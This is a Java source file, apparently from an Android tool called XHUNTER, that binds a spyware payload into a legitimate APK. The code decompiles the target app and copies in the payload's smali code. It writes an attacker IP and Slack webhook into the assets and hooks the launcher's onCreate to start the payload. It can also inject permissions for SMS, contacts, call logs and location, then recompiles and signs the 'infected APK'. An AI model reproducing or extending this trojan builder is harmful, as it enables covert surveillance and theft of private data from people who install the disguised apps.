package com.xhunter;

import android.content.res.AssetManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;

import com.android.apksigner.ApkSignerTool;
import com.facebook.react.bridge.ReactApplicationContext;

import net.dongliu.apk.parser.ApkFile;

import org.apache.commons.io.FileUtils;
import org.apache.commons.io.IOUtils;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;
import org.xmlpull.v1.XmlPullParserFactory;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

import brut.apktool.Main;

public class AppBinder extends AsyncTask<String, String, Boolean> {

    private final ReactApplicationContext reactContext;
    private final String working_dir;
    private final String res_dir;
    private final Logger log;
    private final Boolean injectPermission;


    public AppBinder(ReactApplicationContext context, Boolean injectPermission){
        this.working_dir= Environment.getExternalStorageDirectory().getPath()+"/XHUNTER/payload/";
        this.reactContext=context;
        this.injectPermission=injectPermission;
        this.log =new Logger(reactContext);
        this.res_dir =reactContext.getFilesDir().getAbsolutePath()+"/res/";
    }

    @Override
    protected Boolean doInBackground(String... strings) {
        init();
        if (loadResources())
            if (decompile_normal_apk(strings[0]))
                if (decompile_payload())
                    if (move_payload_files_to_normal_apk())
                        if (edit_app(strings[1],strings[2]))
                            if (hook_smali_file(strings[0]))
                                if(injectPermission&&inject_permissions()){}
                                    if (compile_build())
                                        if (sign()) {
                                            deleteFolder(working_dir + "normal_apk");
                                            deleteFolder(working_dir + "payload");
                                            deleteFile(working_dir+"unsigned.apk");
                                            log.s("[+] Output : /XHUNTER/payload/xhunter_payload.apk");
                                            log.done("!!!! HAPPY HUNTING !!!!");
                                            return true;
                                        }
        return true;
    }


    // helper functions
    private void init(){
        File workingDirectory = new File(working_dir);
        if(!workingDirectory.exists()){
            workingDirectory.mkdirs();
        }
    }
    private boolean loadResources(){
        log.i("Loading Required Resources..");
        try{
            if(injectPermission){
                copyAssets(reactContext.getAssets(), "bin", reactContext.getFilesDir());
            }
            copyAssets(reactContext.getAssets(), "res", reactContext.getFilesDir());
            log.s("[+] Loaded Required Resources Successfully!");
            return true;
        } catch (SecurityException | IOException e){
            log.e("[!] Failed: " + e.toString());
            return false;
        }
    }
    private boolean decompile_payload() {
        log.i("[*] Decompiling Xhunter Payload APK");
        try {
            Main.main(new String[]{"d","-r","-f", res_dir+"payload.apk", "-o", working_dir+"payload", });
            log.s("[+] Decompiled Xhunter Payload Successfully !");
            return true;
        } catch (Exception e) {
            log.e("[!] Failed to Decompile Xhunter Payload APK");
            log.ex("Error: "+ e.toString());
            return false;
        }
    }
    private boolean decompile_normal_apk(String targetApkPath) {
        log.i( "[*] Decompiling Normal/Legitimate APK ");
        log.w("[?] It usually takes few minutes, Do not close app or lock screen!");
        try {
            if(injectPermission){
                String framework =reactContext.getFilesDir().getAbsolutePath()+"/framework";
                Main.main(new String[]{"d", "-p", framework, "-f", targetApkPath , "-o", working_dir+"normal_apk"});
            }else {
                Main.main(new String[]{"d", "-r", "-f", targetApkPath , "-o", working_dir+"normal_apk"});
            }
            log.s( "[+] Decompiled Successfully !");
            return true;
        } catch (Exception e) {
            log.e("[!] Failed to Decompile Normal/Legitimate APK");
            log.ex("Error: "+ e.toString());
            return false;
        }
    }
    private boolean move_payload_files_to_normal_apk(){
        log.i("[*] Moving Xhunter Payload to Normal/Legitimate APK");
        String source1 = working_dir+"payload/smali/com/xhunter";
        String destination1 = working_dir+"normal_apk/smali/com/xhunter";
        String source2 = working_dir+"payload/smali/io";
        String destination2 = working_dir+"normal_apk/smali/io";
        String source3 = working_dir+"payload/smali/okhttp3";
        String destination3 = working_dir+"normal_apk/smali/okhttp3";
        String source4 = working_dir+"payload/smali/okio";
        String destination4 = working_dir+"normal_apk/smali/okio";
        String source5 = working_dir+"payload/unknown/okhttp3";
        String destination5 = working_dir+"normal_apk/unknown/okhttp3";
        try {
            moveDir(source1,destination1);// xhunter payload
            moveSocketIO(source2,destination2);// socket-io
            moveDir(source3,destination3);// okhttp3
            moveDir(source4,destination4);// okio
            moveUnknown(source5,destination5);// unknown
            log.s("[+] Moved Successfully !");
            return true;
        } catch (IOException e) {
            e.printStackTrace();
            log.e("[!] Failed to Move Xhunter Payload Files to Normal/Legitimate APK");
            log.ex("Error: "+ e.toString());
            return false;
        }
    }
    private boolean edit_app(String ip, String slackHook){
        log.i("[*] Trying to inject malicious code");
        try {
            if(new File(working_dir+"normal_apk/assets").exists()) {
                FileWriter fw=new FileWriter(working_dir+"normal_apk/assets/ip.txt");
                if(slackHook.length()>0){
                    fw.write(ip+"\n"+slackHook);
                } else {
                    fw.write(ip+"\n"+ "slackhook");
                }
                fw.close();
                log.s("[+] Injected malicious code Successfully!");
                return true;
            }else if(new File(working_dir+"normal_apk/assets").mkdirs()) {
                FileWriter fw=new FileWriter(working_dir+"normal_apk/assets/ip.txt");
                if(slackHook.length()>0){
                    fw.write(ip+"\n"+slackHook);
                } else {
                    fw.write(ip+"\n"+ "slackhook");
                }
                fw.close();
                log.s("[+] Injected malicious code Successfully!");
                return true;
            }else{
                log.e("[!] Injecting malicious code Failed! Due to assets");
                return false;
            }

        } catch ( IOException e) {
            log.e("[!] Injecting malicious code Failed!");
            log.ex("Error: "+e.toString());
            return false;
        }
    }
    private boolean hook_smali_file(String targetApkPath){
        try (ApkFile apkFile = new ApkFile(new File(targetApkPath))) {
            String manifestXml = apkFile.getManifestXml();
            String smali_hook_path = getHookSmaliPath(manifestXml);
            if(smali_hook_path != null) {
                log.sp("Found smali path :---> "+smali_hook_path);
                hook_payload(working_dir+"normal_apk/smali/"+smali_hook_path);
                log.s("[+] Hooked Successfully !");
                return true;
            }else{
                log.e("[!] Unable to locate the .smali launcher in AndroidManifest.xml");
                log.ex("[!] Try another apk/app");
                return false;
            }
        }catch(IOException e){
            log.e("[!] Failed to Hook Xhunter Payload");
            log.ex("Error: "+e.toString());
            return false;
        }
    }
    private boolean inject_permissions(){
        log.i("[*] Injectng permissions...");
        String manifest = readManifest();
        int index=manifest.indexOf("<uses-permission");
        String newManifest = manifest.substring(0, index) + PERMISSIONS + manifest.substring(index);
        try {
            FileOutputStream fileOut = new FileOutputStream(working_dir + "normal_apk/AndroidManifest.xml"); //writes file
            fileOut.write(newManifest.getBytes());
            fileOut.close();
            log.s("[*] Permissions inject success!");
            return true;
        }catch (IOException e) {
            log.e("[!] Failed to inject permissions");
            log.ex("Error: "+ e.toString());
            return false;
        }
    }
    private boolean compile_build() {
        log.i("[*] Compiling Infected APK, Please wait.");
        log.w("[?] It usually takes few minutes, Do not close app or lock screen!");
        try {
            if(injectPermission){
                String framework =reactContext.getFilesDir().getAbsolutePath()+"/framework";
                Main.main(new String[]{"b","-a", getAapt(),"-p", framework, working_dir+"normal_apk", "-o", working_dir+"unsigned.apk"});
            }else{
                Main.main(new String[]{"b", working_dir+"normal_apk", "-o", working_dir+"unsigned.apk"});
            }
            log.s("[+] Compiled Infected APK Successfully !");
            return true;
        } catch (Exception e) {
            if(injectPermission){
                log.w("[?] Failed to Compile Infected APK!");
                return compile_build_aapt2();
            }else{
                log.e("[!] Failed to Compile Infected APK");
                log.ex("Error: "+ e.toString());
                return false;
            }
        }
    }
    private boolean compile_build_aapt2() {
        log.i("[*] Trying again using --aapt2, Please wait...");
        log.w("[?] It usually takes few minutes, Do not close app or lock screen!");
        try {
            String framework =reactContext.getFilesDir().getAbsolutePath()+"/framework";
            Main.main(new String[]{"b","-a", getAapt2(), "--use-aapt2","-p", framework, working_dir+"normal_apk", "-o", working_dir+"unsigned.apk"});
            log.s("[+] Compiled Infected APK Successfully Using AAPT2 !");
            return true;
        } catch (Exception e) {
            log.e("[!] Failed to Compile Infected APK");
            log.ex("Error: "+ e.toString());
            return false;
        }
    }
    private boolean sign() {
       log.i("[*] Trying to Sign APK Using APKsigner");
        try {
            ApkSignerTool.main(new String[]{"sign", "--key", res_dir+"test.pk8", "--cert", res_dir+"test.pem", "--out", working_dir+"xhunter_payload.apk", working_dir+"unsigned.apk"});
            log.s("[+] Signed Infected APK !");
            return true;
        } catch (Exception e) {
            log.e("[!] Failed to Sign Infected APK");
            log.ex("Error: "+e.toString());
            return false;
        }
    }



    // sub-helper functions
    private static void copyAssets(AssetManager assets, String assetPath, File destFolder) throws IOException {
        String[] childs = assets.list(assetPath);
        if (childs.length == 0) {
            copyFile(assets, assetPath, destFolder);
        } else {
            copyFolder(assets, assetPath, destFolder);
        }
    }
    private static void copyFolder(AssetManager assets, String assetPath, File destFolder) throws IOException {
        String[] names = assets.list(assetPath);
        for (String name : names) {
            copyAssets(assets, assetPath + "/" + name, destFolder);
        }
    }
    private static void copyFile(AssetManager assets, String assetPath, File destFolder) throws IOException {
        File outFile = new File(destFolder, assetPath);
        outFile.getParentFile().mkdirs();
        InputStream input = assets.open(assetPath);
        OutputStream output = new FileOutputStream(outFile);
        IOUtils.copy(input, output);
        input.close();
        output.close();
    }
    private void moveDir(String source, String destination) throws IOException{
        if(!(new File(destination).exists())){
            FileUtils.moveDirectory(new File(source), new File(destination));
        }
    }
    private void moveSocketIO(String source, String destination) throws IOException{
        if(!new File(working_dir+"normal_apk/smali/io/socket").exists()) {
            if (!new File(working_dir+"normal_apk/smali/io").exists()) {
                FileUtils.moveDirectory(new File(source), new File(destination));
            }else{
                FileUtils.moveDirectory(new File(source+"/socket"), new File(destination+"/socket"));
            }
        }//then do nothing
    }
    private void moveUnknown(String source, String destination) throws IOException{
        if(new File(working_dir+"normal_apk/unknown").exists()) {
            if (!new File(destination).exists()) {
                FileUtils.moveDirectory(new File(source), new File(destination));
            }
        }else{
            if(new File(working_dir+"normal_apk/unknown").mkdir()){
                FileUtils.moveDirectory(new File(source), new File(destination));
            }
        }
    }
    private String getHookSmaliPath(String manifestXml) {
        String hook_smali_path=null;
        List<String> smali_path_list = new ArrayList<>();
        try{
            XmlPullParserFactory factory = XmlPullParserFactory.newInstance();
            factory.setNamespaceAware(true);
            XmlPullParser xpp = factory.newPullParser();
            xpp.setInput( new StringReader( manifestXml ) );
            int eventType = xpp.getEventType();
            while (eventType != XmlPullParser.END_DOCUMENT) {
                if(eventType == XmlPullParser.START_TAG) {
                    if(xpp.getName().equals("activity")){
                        int i=0;
                        String smali_path="";
                        while (i<xpp.getAttributeCount()) {
                            if (xpp.getAttributeName(i).equals("name")) {
                                smali_path=xpp.getAttributeValue(i);
                                smali_path_list.add(smali_path);// collect all actitivity
                            }
                            i++;
                        }
                        while (eventType != XmlPullParser.END_TAG) {
                            xpp.next();
                            if ((xpp.getName() != null) && (xpp.getEventType() != XmlPullParser.END_TAG) && (xpp.getName().equals("action"))) {
                                if (xpp.getAttributeValue(0).equals("android.intent.action.MAIN")) {
                                    hook_smali_path = smali_path.replaceAll("\\.","/")+".smali";
                                }
                            }//action
                            if ((xpp.getName() != null) && (xpp.getName().equals("activity"))) {
                                break;
                            }
                        }//iterating through a Activity for all its elements like <intent-filter/> <action/>
                    }//if current element is actitvity then true
                }
                eventType = xpp.next();
            }
        }catch (XmlPullParserException | IOException e){
            e.printStackTrace();
        }
        if(hook_smali_path == null){
            if(smali_path_list.size()>0){
                int i=0;
                String tmp_path="";
                while (i<smali_path_list.size()){
                    tmp_path = smali_path_list.get(i).replaceAll("\\.","/")+".smali";
                    if( new File(working_dir+"normal_apk/smali/"+tmp_path).exists()){ //if no suitable path found return first activity path
                        return tmp_path;
                    }
                    i++;
                }
            }
        }
        return hook_smali_path;
    }
    private void hook_payload(String path){
        try
        {
            File file=new File(path);    //creates a new file instance
            FileReader fr=new FileReader(file);   //reads the file
            BufferedReader br=new BufferedReader(fr);  //creates a buffering character input stream
            StringBuilder sb=new StringBuilder();    //constructs a string buffer with no characters
            String line;
            Pattern pattern = Pattern.compile(";->onCreate\\(Landroid/os/Bundle;\\)V");
            while((line=br.readLine())!=null)
            {
                sb.append(line);      //appends line to string buffer
                sb.append("\n");     //line feed
                boolean matchFound = pattern.matcher(line).find();
                if(matchFound){
                    sb.append("invoke-static {p0}, Lcom/xhunter/client/Payload;->start(Landroid/content/Context;)V");
                    sb.append("\n");
                }
            }
            fr.close();    //closes the stream and release the resources
            FileOutputStream fileOut = new FileOutputStream(path); //writes file
            fileOut.write(sb.toString().getBytes());
            fileOut.close();
        }
        catch(IOException e)
        {
            e.printStackTrace();
        }
    }
    private void deleteFolder(String path){
        File dir = new File(path);
        if (dir.exists()) {
            String deleteCmd = "rm -r " + path;
            Runtime runtime = Runtime.getRuntime();
            try {
                runtime.exec(deleteCmd);
            } catch (IOException e) { }
        }
    }
    private void deleteFile(String path){
        File file = new File(path);
        if (file.exists()) {
            try {
                file.delete();
            } catch (SecurityException e){
                e.printStackTrace();
            }
        }
    }
    private String getAapt() throws IOException {
        File aaptBin = new File(reactContext.getFilesDir(), "aapt");
        InputStream inputStream = reactContext.getAssets().open("bin/"+getArchName() + "/aapt");
        OutputStream outputStream = new FileOutputStream(aaptBin);
        IOUtils.copy(inputStream, outputStream);
        inputStream.close();
        outputStream.close();
        aaptBin.setExecutable(true);
        return aaptBin.getAbsolutePath();
    }
    private String getAapt2() throws IOException {
        File aapt2Bin = new File(reactContext.getFilesDir(), "aapt2");
        InputStream inputStream = reactContext.getAssets().open("bin/"+getArchName() + "/aapt2");
        OutputStream outputStream = new FileOutputStream(aapt2Bin);
        IOUtils.copy(inputStream, outputStream);
        inputStream.close();
        outputStream.close();
        aapt2Bin.setExecutable(true);
        return aapt2Bin.getAbsolutePath();
    }
    private static String getArchName() {
        for (String androidArch : Build.SUPPORTED_ABIS) {
            switch (androidArch) {
                case "arm64-v8a":
                    return androidArch;

                case "armeabi-v7a":
                    return androidArch;

                case "x86_64":
                    return androidArch;

                case "x86":
                    return androidArch;

            }
        }
        return "armeabi-v7a";
    }
    private String readManifest(){
        StringBuilder builder = new StringBuilder();
        try (BufferedReader buffer = new BufferedReader(new FileReader(working_dir+"normal_apk/AndroidManifest.xml"))) {
            String str;
            while ((str = buffer.readLine()) != null) {
                builder.append(str).append("\n");
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        }
        return builder.toString();
    }

    private static String PERMISSIONS="   <uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" />\n" +
            "    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>\n" +
            "    <uses-permission android:name=\"android.permission.READ_SMS\" />\n" +
            "    <uses-permission android:name=\"android.permission.READ_CONTACTS\" />\n" +
            "    <uses-permission android:name=\"android.permission.READ_CALL_LOG\" />\n" +
            "    <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\" />\n" +
            "    <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\" />\n" +
            "    <uses-permission android:name=\"android.permission.SEND_SMS\" />\n";
}